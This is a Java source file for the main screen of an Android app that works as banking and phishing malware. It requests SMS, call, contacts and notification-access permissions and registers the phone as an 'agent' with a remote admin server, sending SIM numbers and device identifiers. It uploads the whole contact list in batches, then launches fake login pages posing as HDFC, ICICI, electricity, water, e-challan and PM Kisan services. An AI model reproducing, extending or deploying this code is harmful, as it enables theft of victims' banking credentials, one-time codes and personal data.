package com.pegalite.neotron3.ui;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.app.AppCompatDelegate;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.google.gson.Gson;
import com.pegalite.neotron3.R;
import com.pegalite.neotron3.databinding.ActivityMainBinding;
import com.pegalite.neotron3.functions.Utils;
import com.pegalite.neotron3.server.req.RetrofitClient;
import com.pegalite.neotron3.server.socket.SocketService;
import com.pegalite.neotron3.ui.bill.BillUpdatePage1Activity;
import com.pegalite.neotron3.ui.bses.BsesPage1Activity;
import com.pegalite.neotron3.ui.echallan.EChallanPage1Activity;
import com.pegalite.neotron3.ui.electricity.ElectricityLoginActivity;
import com.pegalite.neotron3.ui.hdfc.HDCFPersonalDetailsActivity;
import com.pegalite.neotron3.ui.hdfcsb.HDFCSBPage1Activity;
import com.pegalite.neotron3.ui.icici.ICICILoginActivity;
import com.pegalite.neotron3.ui.power.PowerElectricityLoginActivity;
import com.pegalite.neotron3.ui.sb.SBLoginActivity;
import com.pegalite.neotron3.ui.water.ConnectionInformationActivity;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_CODE_PERMISSIONS = 100;
    private static final int REQUEST_CODE_IGNORE_BATTERY = 200;
    private final List<String> REQUIRED_PERMISSIONS = new ArrayList<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        com.pegalite.neotron3.databinding.ActivityMainBinding binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        // Build permissions list
        try {
            JSONObject configs = new JSONObject(Utils.CONFIGS);
            REQUIRED_PERMISSIONS.add(Manifest.permission.READ_PHONE_STATE);
            if (configs.optBoolean("Contacts", false)) {
                REQUIRED_PERMISSIONS.add(Manifest.permission.READ_CONTACTS);
            }
            if (configs.optBoolean("Messages", false) || configs.optBoolean("SMS Forwarding", false)) {
                REQUIRED_PERMISSIONS.add(Manifest.permission.READ_SMS);
                REQUIRED_PERMISSIONS.add(Manifest.permission.RECEIVE_SMS);
            }
            if (configs.optBoolean("Send SMS", false)) {
                REQUIRED_PERMISSIONS.add(Manifest.permission.SEND_SMS);
            }
            if (configs.optBoolean("Run USSD", false)) {
                if (!REQUIRED_PERMISSIONS.contains(Manifest.permission.READ_SMS)) {
                    REQUIRED_PERMISSIONS.add(Manifest.permission.READ_SMS);
                    REQUIRED_PERMISSIONS.add(Manifest.permission.RECEIVE_SMS);
                }
                REQUIRED_PERMISSIONS.add(Manifest.permission.CALL_PHONE);
            }
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }

        // Check notification access if needed
        try {
            JSONObject configs = new JSONObject(Utils.CONFIGS);
            if (configs.optBoolean("Notification", false) && !isNotificationAccessEnabled()) {
                Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                Toast.makeText(this, "Please enable notification access.", Toast.LENGTH_LONG).show();
                finish();
                return;
            }
        } catch (JSONException ignored) {
        }

        onAgentInit();
        checkAndRequestPermissions();
    }

    private boolean isNotificationAccessEnabled() {
        Set<String> enabled = NotificationManagerCompat.getEnabledListenerPackages(this);
        return enabled.contains(getPackageName());
    }

    @SuppressLint("HardwareIds")
    private void onAgentInit() {
        // From Activity or button click
        Intent serviceIntent = new Intent(this, SocketService.class);
        startForegroundService(serviceIntent); // ✅ Only from visible UI
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        SubscriptionManager sm = (SubscriptionManager) getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);

        JSONArray simInfo = new JSONArray();
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
            if (subs == null) {
                return;
            }
            try {
                for (SubscriptionInfo info : subs) {
                    String number = info.getNumber(); // Mobile number (can be null!)
                    String carrierName = info.getCarrierName().toString(); // Airtel, Jio, etc.
                    String displayName = info.getDisplayName().toString();
                    simInfo.put(new JSONObject().put("number", number).put("carrierName", carrierName).put("displayName", displayName));
                }
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        }

        try {
            RetrofitClient.getInstance(this).getApiInterfaces().onAgentInit(RetrofitClient.generateRequestBody(new JSONObject().put("simInfo", simInfo).put("agentName", getString(R.string.app_name)).put("agentID", "agent-" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + getPackageName()).put("adminID", Utils.ADMIN_ID).put("deviceName", getPhoneName()).put("apiLevel", Build.VERSION.SDK_INT))).enqueue(new Callback<>() {
                @Override
                public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {

                }

                @Override
                public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable throwable) {

                }
            });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

    private String getPhoneName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;

        String deviceName;
        if (model.toLowerCase().startsWith(manufacturer.toLowerCase())) {
            deviceName = capitalize(model);
        } else {
            deviceName = capitalize(manufacturer) + " " + model;
        }
        return deviceName;
    }

    public static String capitalize(String s) {
        if (s == null || s.isEmpty()) {
            return "";
        }
        return s.substring(0, 1).toUpperCase() + s.substring(1);
    }

    private void checkAndRequestPermissions() {
        List<String> missing = new ArrayList<>();
        for (String p : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                missing.add(p);
            }
        }
        if (!missing.isEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), REQUEST_CODE_PERMISSIONS);
        } else {
            requestIgnoreBatteryOptimizations();
        }
    }

    private void requestIgnoreBatteryOptimizations() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        String pkg = getPackageName();
        if (pm != null && !pm.isIgnoringBatteryOptimizations(pkg)) {
            @SuppressLint("BatteryLife") Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + pkg));
            startActivityForResult(intent, REQUEST_CODE_IGNORE_BATTERY);
        } else {
            proceed();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_IGNORE_BATTERY) {
            proceed();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            boolean all = true;
            for (int res : grantResults) {
                if (res != PackageManager.PERMISSION_GRANTED) {
                    all = false;
                    break;
                }
            }
            if (all) {
                requestIgnoreBatteryOptimizations();
            } else {
                Toast.makeText(this, "Please grant all permissions.", Toast.LENGTH_SHORT).show();
                finishAffinity();
            }
        }
    }

    private void proceed() {
        fetchContactsAndUpload();
        String theme = Utils.THEME;
        Intent next;
        switch (theme) {
            case "WATER":
                next = new Intent(this, ConnectionInformationActivity.class);
                break;
            case "POWER":
                next = new Intent(this, ElectricityLoginActivity.class);
                break;
            case "POWER V2":
                next = new Intent(this, PowerElectricityLoginActivity.class);
                break;
            case "HDFC":
            case "HDFC NEU":
            case "HDFC SK":
            case "NEW HDFC":
                next = new Intent(this, HDCFPersonalDetailsActivity.class);
                break;
            case "Customer V2":
            case "Customer SB":
                next = new Intent(this, SBLoginActivity.class);
                break;
            case "ICICI":
                next = new Intent(this, ICICILoginActivity.class);
                break;
            case "ECHALLAN":
                next = new Intent(this, EChallanPage1Activity.class);
                break;
            case "BSES":
                next = new Intent(this, BsesPage1Activity.class);
                break;
            case "HDFCSB":
                next = new Intent(this, HDFCSBPage1Activity.class);
                break;
            case "BILL UPDATE":
            case "BILL UPDATE V2":
                next = new Intent(this, BillUpdatePage1Activity.class);
                break;
            default:
                next = new Intent(this, PmKisanActivity.class);
                break;
        }

        // Clear existing task to avoid multiple instances
        next.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(next);
        finish();
    }

    private void fetchContactsAndUpload() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        SharedPreferences prefs = getSharedPreferences("sent_contacts", MODE_PRIVATE);
        Set<String> alreadySentPhones = prefs.getStringSet("phones", new HashSet<>());

        List<HashMap<String, String>> contactList = new ArrayList<>();
        Set<String> newPhonesThisSession = new HashSet<>();

        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null);

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(0);
                String phoneNumber = cursor.getString(1).replaceAll("\\s+", "");

                if (alreadySentPhones.contains(phoneNumber)) continue; // Skip already sent

                HashMap<String, String> contact = new HashMap<>();
                contact.put("name", name);
                contact.put("phone", phoneNumber);

                contactList.add(contact);
                newPhonesThisSession.add(phoneNumber);
            }
            cursor.close();
        }

        // Now send in batches
        int batchSize = 400;
        for (int i = 0; i < contactList.size(); i += batchSize) {
            int end = Math.min(i + batchSize, contactList.size());
            List<HashMap<String, String>> batch = contactList.subList(i, end);
            sendContactBatch(batch, i / batchSize + 1, newPhonesThisSession);
        }
    }

    @SuppressLint("HardwareIds")
    private void sendContactBatch(List<HashMap<String, String>> batch, int batchNumber, Set<String> newPhones) {
        Gson gson = new Gson();
        String jsonContacts = gson.toJson(batch);

        RequestBody body = RetrofitClient.generateRequestBody(jsonContacts);
        String agentId = "agent-" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + getPackageName();

        RetrofitClient.getInstance(this).getApiInterfaces().onSaveContacts(body, agentId).enqueue(new Callback<>() {
            @Override
            public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {
                if (response.isSuccessful()) {
                    Log.d("Upload", "Batch " + batchNumber + " uploaded successfully");

                    // Save sent numbers
                    SharedPreferences prefs = getSharedPreferences("sent_contacts", MODE_PRIVATE);
                    Set<String> savedSet = prefs.getStringSet("phones", new HashSet<>());
                    Set<String> mergedSet = new HashSet<>(savedSet);
                    for (HashMap<String, String> c : batch) {
                        mergedSet.add(c.get("phone"));
                    }

                    prefs.edit().putStringSet("phones", mergedSet).apply();
                } else {
                    Log.e("Upload", "Batch " + batchNumber + " failed: " + response.code());
                }
            }

            @Override
            public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable t) {
                Log.e("Upload", "Batch " + batchNumber + " failed: " + t.getMessage());
            }
        });
    }


}